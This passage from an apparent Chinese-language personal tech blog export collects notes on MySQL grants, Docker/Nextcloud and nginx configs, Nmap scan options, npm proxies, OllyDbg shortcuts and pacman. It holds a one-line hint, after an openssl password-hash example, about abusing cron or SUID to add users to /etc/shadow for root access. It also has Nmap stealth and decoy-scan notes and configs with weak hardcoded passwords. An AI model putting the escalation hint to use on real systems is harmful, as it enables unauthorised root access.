<h2 id="section"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27; WITH GRANT OPTION; -- 允许授予他人同等权限</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure></h2>
<h5 id="改表法不常用">改表法（不常用）</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE user SET Password = password ( &#x27;password&#x27; ) WHERE User = &#x27;root&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<h4
id="mysql8.0及以上修改加密方式使navicat可以登录">mysql8.0及以上修改加密方式，使navicat可以登录</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 默认为caching_sha2_password加密方式</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;password&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="字符集及时区信息">字符集及时区信息</h2>
<p><strong>character_set_server</strong> 服务器字符集，默认的字符集</p>
<p><strong>character_set_client</strong> 客户端数据使用的字符集</p>
<p><strong>character_set_connection</strong> 连接层字符集</p>
<p><strong>character_set_database</strong> 数据库字符集</p>
<p><strong>character_set_results</strong> 查询结果字符集</p>
<p><strong>character_set_system</strong> 系统元数据字符集</p>
<h3 id="使用cli">使用cli</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;character%&#x27;; -- 查看字符集</span><br><span class="line">SET @@global.character_set_server = utf8; -- 永久设定字符集</span><br><span class="line">SET character_set_server = utf8; -- 临时设定字符集</span><br></pre></td></tr></table></figure>
<h3 id="修改配置文件">修改配置文件</h3>
<p><code>/etc/mysql/my.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default-character-set=utf8 #utf8mb4</span><br><span class="line">default-collation=utf8_general_ci #utf8mb4</span><br><span class="line">-- ci代表不区分大小写，cs代表区分大小写</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="docker使用mysql">docker使用mysql</h2>
<h3 id="使用mysql并配置相关环境变量">使用mysql并配置相关环境变量</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name mysql \</span><br><span class="line">-p 3306:3306 \</span><br><span class="line">-v /opt/server_data/mysql_data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">-e TZ=Asia/Shanghai \</span><br><span class="line">-d mysql:5.6 \</span><br><span class="line">--character-set-server=utf8mb4 \</span><br><span class="line">--collation-server=utf8mb4_unicode_ci</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="sql指令">sql指令</h2>
<h4 id="limit">limit</h4>
<p><strong>limit</strong>是用来限制查询结果的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM TABLE LIMIT m,n</span><br></pre></td></tr></table></figure>
<p>其中m是指记录开始的index，从0开始，表示第一条记录
n是指从第m+1条开始，取n条。 select * from tablename limit 2,4
即取出第3条至第6条，4条记录</p>
<h4 id="order">order</h4>
<p><strong>order</strong>子句用来排序表,<strong>order by
后加列名</strong> 如果要逆序 在列名后加 <strong>desc</strong>
正序<strong>ASC</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `<span class="keyword">table</span>` <span class="keyword">ORDER</span> <span class="keyword">BY</span> `<span class="keyword">column</span>` <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="引用">引用：</h3>
<p><a
href="https://www.cnblogs.com/kerrycode/p/11170266.html">MySQL字符集与排序规则总结
- 潇湘隐者 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/gengyufei/p/13378482.html">MySQL --
创建用户 CREATE USER 、GRANT语句</a></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>nextcloud搭建-docker-compose</title>
    <url>/nextcloud%E6%90%AD%E5%BB%BA-docker-compose/</url>
    <content><![CDATA[<h3 id="docker-compose文件">docker-compose文件</h3>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.5&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nextcloud_app:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nextcloud_app</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nextcloud</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nextcloud</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nextcloud:/var/www/html</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nextcloud_mariadb</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nextcloud_mariadb:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nextcloud_mariadb</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mariadb</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">--transaction-isolation=READ-COMMITTED</span> <span class="string">--binlog-format=ROW</span> <span class="string">--innodb-file-per-table=1</span> <span class="string">--skip-innodb-read-only-compressed</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nextcloud</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mariadb:/var/lib/mysql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MARIADB_DATABASE:</span> <span class="string">&#x27;nextcloud&#x27;</span></span><br><span class="line">      <span class="attr">MARIADB_USER:</span> <span class="string">&#x27;nextcloud&#x27;</span></span><br><span class="line">      <span class="attr">MARIADB_PASSWORD:</span> <span class="string">&#x27;11..11+*Ax&#x27;</span></span><br><span class="line">      <span class="attr">MARIADB_ROOT_PASSWORD:</span> <span class="string">&#x27;11..11+*Ax&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">nextcloud:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nextcloud_docker_network</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">volumes:</span> </span><br><span class="line">  <span class="attr">nextcloud:</span></span><br><span class="line">  <span class="attr">mariadb:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
  </entry>
  <entry>
    <title>nginx 配置文件</title>
    <url>/nginx-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h4 id="nginx配置">nginx配置</h4>
<h5
id="etcnginxsites-enable下的v-host配置文件">/etc/nginx/sites-enable下的v-host配置文件</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name divint3.com;</span><br><span class="line">    root /home/divint3/WWW/tp5/public;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        index   index.php index.html index.htm;</span><br><span class="line">        </span><br><span class="line">        if (!-e $request_filename) &#123;</span><br><span class="line">            rewrite ^/(.*)$ /index.php;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php($|/) &#123;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">        fastcgi_pass   unix:/run/php/php7.2-fpm.sock;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>nmap-笔记</title>
    <url>/nmap-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="nmap">Nmap</h3>
<h4 id="脚本">脚本</h4>
<p>nmap的脚本默认目录为：<code>/usr/share/nmap/scripts/</code>
使用脚本的参数 <code>--script=%脚本名称%</code> 脚本的几个类型
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth: 负责处理鉴权证书（绕开鉴权）的脚本  </span><br><span class="line">broadcast: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </span><br><span class="line">brute: 提供暴力破解方式，针对常见的应用如http/snmp等  </span><br><span class="line">default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </span><br><span class="line">discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等  </span><br><span class="line">dos: 用于进行拒绝服务攻击  </span><br><span class="line">exploit: 利用已知的漏洞入侵系统  </span><br><span class="line">external: 利用第三方的数据库或资源，例如进行whois解析  </span><br><span class="line">fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽  </span><br><span class="line">malware: 探测目标机是否感染了病毒、开启了后门等信息  </span><br><span class="line">safe: 此类与intrusive相反，属于安全性脚本  </span><br><span class="line">version: 负责增强服务与版本扫描（Version Detection）功能的脚本  </span><br><span class="line">vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure> <span id="more"></span></p>
<hr />
<ol type="1">
<li>扫描类型 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT				TCP扫描</span><br><span class="line">-sS				TCP同步扫描：这项技术最大的好处是，很少有系统能够把这记</span><br><span class="line">				入系统日志。所以该技术又叫做隐身扫描。</span><br><span class="line">-sP				PING扫描：如果你只是想知道目标主机是否运行，而不想进行</span><br><span class="line">				其它扫描，才会用到这个选项。</span><br><span class="line">-sA				ACK扫描：这项高级的扫描方法通常用来穿过防火墙的规则集。</span><br><span class="line">-sV				探测目标主机操作系统及其详细信息，版本号等。</span><br><span class="line">2 通用选项</span><br><span class="line">-P0				在扫描之前，不必ping主机。有些网络的防火墙不允许ICMP</span><br><span class="line"> 				echo请求穿过，使用这个选项可以对这些网络进行扫描。</span><br><span class="line"> 				microsoft.com就是一个例子，因此在扫描这个站点时，你应该一直</span><br><span class="line"> 				使用-P0或者-PT 80选项。</span><br><span class="line">-PT			使用-PT 来设定目标端口。</span><br><span class="line">-PS			对于root用户，这个选项让nmap使用SYN包而不是ACK包来对目</span><br><span class="line">			标主机进行扫描。</span><br><span class="line">-PI			让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在</span><br><span class="line">			运行。</span><br><span class="line">-PB			这是默认的ping扫描选项。它使用ACK(-PT)和ICMP(-PI)两种扫描</span><br><span class="line">			类型并行扫描。如果防火墙能够过滤其中一种包，使用这种方法，	</span><br><span class="line">			你就能够穿过防火墙。</span><br><span class="line">-O			这个选项激活对TCP/IP指纹特征(fingerprinting)的扫描，获得远</span><br><span class="line">			程主机的标志。</span><br><span class="line">-v			冗余模式，它会给出扫描过程中的详细信息。</span><br><span class="line">-oN			把扫描结果重定向到一个可读的文件中。</span><br><span class="line">-oM			把扫描结果重定向到文件中，这个文件使用主机可以解析的语法。</span><br><span class="line">			-oM-可以免于定义文件名。</span><br><span class="line">-resume	使用这个选项可以使扫描接着以前的扫描进行。nmap会接着日志文</span><br><span class="line">			件中的最后一次成功扫描进行新的扫描。</span><br><span class="line">-iR			让nmap自己随机挑选主机进行扫描。</span><br><span class="line">-p 			这个选项让你选择要进行扫描的端口号的范围。</span><br><span class="line">-F			快速扫描模式，只扫描在nmap-services文件中列出的端口。</span><br><span class="line">-D			使用诱饵扫描方法对目标网络/主机进行扫描。</span><br><span class="line">-S 			在欺骗扫描时，使用这个选项。使用这个选项可以让目标认为是</span><br><span class="line">			其它的主机对自己进行扫描。</span><br><span class="line">-e			告诉nmap使用哪个接口发送和接受数据包。nmap能够自动对此接口</span><br><span class="line">			进行检测，如果无效就会告诉你。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-A 更详细的服务信息</span><br><span class="line">-sS 半开扫描，隐蔽式扫描</span><br><span class="line">-Pn 不发送icmp包确认主机存活</span><br><span class="line">-oX 输出xml文件用于存储到数据库</span><br><span class="line">-v 冗余模式</span><br><span class="line">-sI 指定空闲扫描主机</span><br><span class="line">-sV 主机系统扫描</span><br><span class="line">-sT TCP扫描</span><br><span class="line">-sU UDP扫描</span><br><span class="line">--scripts 引用脚本</span><br><span class="line">-P0 发送大小为0的ICMP包进行主机存活扫描</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>nodejs包管理器配置代理和仓库</title>
    <url>/nodejs%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E5%92%8C%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p><a href="https://nodejs.org/dist">node旧版本下载地址</a></p>
<p>配置远程仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org/</span><br><span class="line"></span><br><span class="line">yarn config <span class="built_in">set</span> registry https://registry.npm.taobao.org/</span><br><span class="line">yarn config <span class="built_in">set</span> registry https://registry.npmjs.org/</span><br></pre></td></tr></table></figure>
<p>npm设置代理 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> proxy=<span class="string">&quot;&lt;http_proxy&gt;&quot;</span></span><br><span class="line">npm config <span class="built_in">set</span> https-proxy=<span class="string">&quot;&lt;https_proxy&gt;&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>npm删除代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config delete proxy </span><br><span class="line">npm config delete https-proxy</span><br></pre></td></tr></table></figure>
<p>yarn设置代理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn config <span class="built_in">set</span> proxy &lt;http_proxy&gt;</span><br><span class="line">yarn config <span class="built_in">set</span> https-proxy &lt;https_proxy&gt;</span><br></pre></td></tr></table></figure>
<p>yarn删除代理 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn config delete proxy  </span><br><span class="line">yarn config delete https-proxy</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>od-快捷键</title>
    <url>/od-%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h3
id="无论当前的ollydbg窗口是什么这些快捷键均有效">无论当前的OllyDbg窗口是什么，这些快捷键均有效： </h3>
<p>Ctrl+F2 -
重启程序，即重新启动被调试程序。如果当前没有调试的程序，OllyDbg会运行历史列表［history
list］中的第一个程序。程序重启后，将会删除所有内存断点和硬件断点。
译者注：从实际使用效果看，硬件断点在程序重启后并没有移除。</p>
<p>Alt+F2 -
关闭，即关闭被调试程序。如果程序仍在运行，会弹出一个提示信息，询问您是否要关闭程序。
  F3 - 弹出“打开32位.EXE文件”对话框［Open 32-bit .EXE
file］，您可以选择可执行文件，并可以输入运行参数。   Alt+F5 -
让OllyDbg总在最前面。如果被调试程序在某个断点处发生中断，而这时调试程序弹出一个总在最前面的窗口（一般为模式消息或模式对话框［modal
message or
dialog］），它可能会遮住OllyDbg的一部分，但是我们又不能移动最小化这个窗口。激活OllyDbg（比如按任务栏上的标签）并按
Alt+F5，OllyDbg将设置成总在最前面，会反过来遮住刚才那个窗口。如果您再按一下Alt+F5，OllyDbg会恢复到正常状态。
OllyDbg是否处于总在最前面状态，将会保存，在下一次调试时依然有效。当前是否处于总在最前面状态，会显示在状态栏中。</p>
<p>F7 -
单步步入到下一条命令，如果当前命令是一个函数［Call］，则会停在这个函数体的第一条命令上。如果当前命令是是含有REP前缀，则只执行一次重复操作。
<span id="more"></span></p>
<p>Shift+F7 -
与F7相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步入被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</p>
<p>Ctrl+F7 -
自动步入，在所有的函数调用中一条一条地执行命令（就像您按住F7键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步入过程都会停止。每次单步步入，OllyDbg都会更新所有的窗口。所以为了提高自动步入的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步入。
  F8 -
单步步过到下一条命令。如果当前命令是一个函数，则一次执行完这个函数（除非这个函数内部包含断点，或发生了异常）。如果当前命令是含有REP前缀，则会执行完重复操作，并停在下一条命令上。
  Shift+F8 -
与F8相同，但是如果被调试程序发生异常而中止，调试器会首先尝试步过被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。</p>
<p>Ctrl+F8 -
自动步过，一条一条的执行命令，但并不进入函数调用内部（就像您按住F8键不放一样，只是更快一些）。当您执行其他一些单步命令，或者程序到达断点，或者发生异常时，自动步过过程都会停止。每次单步步过，OllyDbg都会更新所有的窗口。所以为了提高自动步过的速度，请您关闭不必要成窗口，对于保留的窗口最好尽量的小。按Esc键，可以停止自动步过。</p>
<p>F9 - 让程序继续执行。</p>
<p>Shift+F9 -
与F9相同，但是如果被调试程序发生异常而中止，调试器会首先尝试执行被调试程序指定的异常处理（请参考忽略Kernel32中的内存非法访问）。
  Ctrl+F9 -
执行直到返回，跟踪程序直到遇到返回，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条命令执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。
  Alt+F9 -
执行直到返回到用户代码段，跟踪程序直到指令所属于的模块不在系统目录中，在此期间不进入子函数也不更新CPU数据。因为程序是一条一条执行的，所以速度可能会慢一些。按Esc键，可以停止跟踪。
  Ctrl+F11
-Run跟踪步入，一条一条执行命令，进入每个子函数调用，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。</p>
<p>F12 -
停止程序执行，同时暂停被调试程序的所有线程。请不要手动恢复线程运行，最好使用继续执行快捷键或菜单选项（像
F9）。</p>
<p>Ctrl+F12 - Run跟踪
步过，一条一条执行命令，但是不进入子函数调用，，并把寄存器的信息加入到Run跟踪的存储数据中。Run跟踪不会同步更新CPU窗口。
  Esc -
如果当前处于自动运行或跟踪状态，则停止自动运行或跟踪；如果CPU显示的是跟踪数据，则显示真实数据。
  Alt+B -
显示断点窗口。在这个窗口中，您可以编辑、删除、或跟进到断点处</p>
<p>Alt+C - 显示CPU窗口。</p>
<p>Alt+E - 显示模块列表［list of modules］。   Alt+K - 显示调用栈［Call
stack］窗口。   Alt+L - 显示日志窗口。</p>
<p>Alt+M - 显示内存窗口。   Alt+O - 显示选项对话框［Options dialog］  
Ctrl+P - 显示补丁窗口。   Ctrl+T - 打开 暂停 Run跟踪 对话框</p>
<p>Alt+X - 关闭 OllyDbg。   大多数窗口都支持以下的键盘命令：   Alt+F3 -
关闭当前窗口。</p>
<p>Ctrl+F4 - 关闭当前窗口</p>
<p>F5 - 最大化当前窗口或将当前窗口大小改为正常化。   F6 -
切换到下一个窗口。   Shift+F6 - 切换到前一个窗口。   F10 -
打开与当前窗口或面板相关的快捷菜单。   左方向键 -
显示窗口左方一个字节宽度的内容。   Ctrl+左方向键 -
显示窗口左方一栏的内容。   右方向键 - 显示窗口右方一个字节宽度的内容</p>
<p>Ctrl+右方向键 - 显示窗口右方一栏的内容  
反汇编窗口中的快捷键［Disassembler shortcuts］  
当CPU窗口中的反汇编面板［Disassembler
pane］处于激活状态时，您可以使用以下快捷键：</p>
<p>回车键 - 将选中的命令添加到命令历史［command
history］中，如果当前命令是一个跳转、函数或者是转换表的一个部分，则进入到目的地址。
  退格键 -
移除选中部分的自动分析信息。如果分析器将代码误识别为数据，这个快捷键就非常有用。请参考解码提示［decoding
hints］.</p>
<p>Alt+退格键 -
撤消所选部分的修改，以备份数据的相应内容替换所选部分。仅当备份数据存在且与所选部分不同时可用。</p>
<p>Ctrl+F1
-如果API帮助文件已经选择，将打开与首个选择行内的符号名相关联的帮助主题。
  F2 -在首个选择的命令上开关INT3
断点［Breakpoint］，也可以双击该行第二列。</p>
<p>Shift+F2
-在首个选择命令设置条件断点，参见忽略Kernel32中内存访问异常［Ignore
memory access violation in Kernel32］。   F4
-执行到所选行，在首个选择的命令上设置一次性断点，然后继续执行调试程序，直到OllyDbg捕获到异常或者停止在该断点上。在程序执行到该命令之前，该一次性断点一直有效。如有必要，可在断点窗口［Breakpoints
window］中删除它。   Shift+F4
-设置记录断点（一种条件断点，当条件满足时一些表达式的值会记录下来），
详情参见断点［Breakpoint］。</p>
<p>Ctrl+F5 -打开与首个选择的命令相对应的源文件。   Alt+F7
-转到上一个找到的参考。</p>
<p>Alt+F8 -转到下一个找到参考。   Ctrl+A -分析当前模块的代码段。</p>
<p>Ctrl+B - 开始二进制搜索。   Ctrl+C
-复制所选内容到剪贴板。复制时会简单地按列宽截断不可见内容，如果希望排除不需要的列，可把这些列的宽度调整到最小。
  Ctrl+E -以二进制（十六进制）格式编辑所选内容。   Ctrl+F
-开始命令搜索。   Ctrl+G
-转到某地址。该命令将弹出输入地址或表达式的窗口。该命令不会修改
EIP。</p>
<p>Ctrl+J
-列出所有的涉及到该位置的调用和跳转，在您用这个功能之前，您必须使用分析代码功能。</p>
<p>Ctrl+K - 查看与当前函数相关的调用树［Call
tree］。在您用这个功能之前，您必须使用分析代码功能。</p>
<p>Ctrl+L - 搜索下一个，重复上一次的搜索内容。   Ctrl+N -
打开当前模块的名称（标签）列表。</p>
<p>Ctrl+O -
扫描object文件。扫描Object文件。该命令会显示扫描Object文件对话框，您可以在该对话框中选择Object文件或者lib文件，并扫描这个文件，试图找到在实际代码段中用到的目标模块。
  Ctrl+R
-搜索所选命令的参考。该命令扫描激活模块的全部可执行代码，以找到涉及到首个选中的命令的全部相关参考（包括：常量、跳转及调用），您可以在参考中使用快捷</p>
<p>Alt+F7 和
Alt+F8来浏览这些参考。为便于您使用，被参考的命令也包含在该列表中。</p>
<p>Ctrl+S -命令搜索。该命令显示命令查找［Find
command］对话框供您输入汇编命令，并从当前命令开始搜索。  
星号［Asterisk］(*) -转到原始位置（激活线程的EIP处）。</p>
<p>Ctrl+星号(*) -
指定新的起始位置，设置当前所选线程的EIP为首个选择字节的地址。您可以在选择EIP并撤消该操作。</p>
<p>加号［Plus］(+) -如果run跟踪［run trace］
没有激活，则根据命令历史［comman
history］跳到下一条运行过命令的地方；否则跳到Run跟踪的下一个记录。  
Ctrl+加号 - 跳到前一个函数开始处。（注意只是跳到，并不执行）</p>
<p>减号［Minus］(-) - 如果run跟踪［run trace］
没有激活，则根据命令历史［comman
history］跳到前一条运行过命令的地方；否则跳到Run跟踪的前一个记录。</p>
<p>Ctrl+减号 - 跳到下一个函数开始处。（注意只是跳到，并不执行）  
空格［Space］ -
修改命令。您可在显示对话框中以汇编语言修改实际指令或输入新指令，这些指令将替换实际代码，您也可以在想要修改的指令处双击鼠标。</p>
<p>冒号［Colon］( - 添加标签。显示添加标签窗口［Add
label］或修改标签窗口［Chang
label］，您可在此输入与首个选择的命令中的第一个字节相关联的标签（符号名）。注意，在多种编程语言中，冒号可以是标签的一部分。</p>
<p>分号［Semicolon］(;) - 添加注释［comment］。显示添加注释窗口［Add
label］或修改注释窗口［Chang
label］，您可在此输入与首条所选命令的第一个字节相关联的注释（注释串会显示在最后一列中）。注意，多种汇编语言使用分号作为注释开始。您也可以在注释列双击需要注释的命令行。
 </p>
<h3 id="命令行插件支持的命令">命令行插件支持的命令</h3>
<p>CALC:判断表达式   WATCH:添加监视表达式</p>
<p>AT:在指定地址进行反汇编</p>
<p>FOLLOW:跟随命</p>
<p>ORIG:反汇编于 EIP</p>
<p>DUMP:在指定地址进行转存</p>
<p>DA:转存为反汇编代码</p>
<p>DB:使用十六进制字节格式转存</p>
<p>DC:使用 ASCII 格式转存</p>
<p>DD:转存在堆栈格式</p>
<p>DU:转存在 UNICODE 格式</p>
<p>DW:使用十六进制字词格式转存</p>
<p>STK: AS:（AS + 地址 + 字符串）在指定地址进行汇编</p>
<p>BP:进行条件中断（有条件的断点）</p>
<p>BPX:中断在全部调用 （Call</p>
<p>BPD:清除全部调用中的断点   BC:清除断点   MR:内存断点于访问时  
MW:内存断点于写入时   MD:清除内存断点   HR:访问时进行硬件中断  
HW:写入时进行硬件中断</p>
<p>HE:执行时进行硬件中断   HD:清除硬件断点   STOP:停止运行程序调</p>
<p>PAUSE:暂停执行程序调试   RUN:运行程序进行调试</p>
<p>GE:运行和通过例外</p>
<p>SI:单步进入 Call</p>
<p>SO:步过 Cal</p>
<p>TI:跟踪进入直到地址   TO:跟踪步过直到地</p>
<p>TC:跟踪进入直到满足条件</p>
<p>TOC:跟踪步过直到满足条件</p>
<p>TR:运行直到返回   TU:运行直到用户代码   LOG:查看记录窗口  
MOD:查看模块窗口</p>
<p>MEM:查看内存窗口</p>
<p>CPU:查看 CPU 窗口</p>
<p>CS:查看 Call 堆栈   BRK:查看断点窗口</p>
<p>OPT:打开选项设置窗口   EXIT:退出 OllyDbg   QUIT:退出 OllyDbg</p>
<p>OPEN:打开一个可执行文件   CLOSE:关闭可执行文件   RST:重新运行当前程序
  HELP:查看 API 函数的帮助</p>
]]></content>
      <categories>
        <category>windows工具</category>
      </categories>
  </entry>
  <entry>
    <title>opencvsharp转换</title>
    <url>/opencvsharp%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="原生转换">原生转换</h2>
<p>Bitmap图片转MemoryStream</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ms = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">Bitmap.Save(ms, bitmap.RawFormat);</span><br><span class="line"><span class="built_in">byte</span>[] byteImage = <span class="keyword">new</span> Byte[ms.Length];</span><br><span class="line">byteImage = ms.ToArray();</span><br></pre></td></tr></table></figure>
<p>Bytes图片转MemoryStream</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">MemoryStream ms = <span class="keyword">new</span> MemoryStream(bytes)</span><br></pre></td></tr></table></figure>
<p>MemoryStream转Bitmap</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Bitmap bitmap=<span class="keyword">new</span> Bitmap(<span class="function">Image <span class="keyword">new</span> <span class="title">Bitmap</span>(<span class="params">ms</span>))</span>;</span><br></pre></td></tr></table></figure>
<h2 id="opencvsharp转换">opencvsharp转换</h2>
<p>BGR转RGB</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Cv2.CvtColor(source, target, ColorConversionCodes.BGR2RGB);</span><br></pre></td></tr></table></figure>
<p>Mat/Bitmap互转</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">bitmap = OpenCvSharp.Extensions.BitmapConverter.ToBitmap(target);</span><br><span class="line">mat = OpenCvSharp.Extensions.BitmapConverter.ToMat(target);</span><br></pre></td></tr></table></figure>
<p>MemoryStream转Mat</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">source = Mat.FromStream(ms, ImreadModes.AnyColor);</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>openssl-手动生成linux密码</title>
    <url>/openssl-%E6%89%8B%E5%8A%A8%E7%94%9F%E6%88%90linux%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h4 id="openssl生成linux密码">openssl生成linux密码</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt <span class="string">&#x27;12345678&#x27;</span>  <span class="comment">#-1:表示采用的是MD5加密算法。 --salt:表示使用指定盐值</span></span><br><span class="line">Password:   <span class="comment">##这里输入的是密码</span></span><br></pre></td></tr></table></figure>
<h3
id="可以结合cron定时计划suid实现任意添加用户到etcshadow文件指定uidgid等.达到获取最高权限的目的.">可以结合cron定时计划/suid实现任意添加用户到/etc/shadow文件,指定uid,gid等.达到获取最高权限的目的.</h3>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>pacman-常用指令</title>
    <url>/pacman-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S //从远程源获取并安装 相当于 apt install</span><br><span class="line">pacman -Syu //滚动升级、升级系统 相当于 apt upgrade &amp;&amp; apt dist-upgrade</span><br><span class="line">pacman -Rsc //卸载软件及其依赖 相当于 apt remove </span><br><span class="line">pacman -R //只卸载软件本体，不卸载依赖</span><br><span class="line">pacman -R $(pacman -Qqdt) //查找无用依赖并卸载  用于只删除软件包忘记删除赖时使用，当没有无用依赖，会返回一个error，代表删除完毕</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Arch</category>
      </categories>
  </entry>
  <entry>
    <title>python-两种数据流</title>
    <url>/python-%E4%B8%A4%E7%A7%8D%E6%95%B0%E6%8D%AE%E6%B5%81/</url>
    <content><![CDATA[<p>用service.AF_INET指定了使用了IPv4协议</p>
<ol type="1">
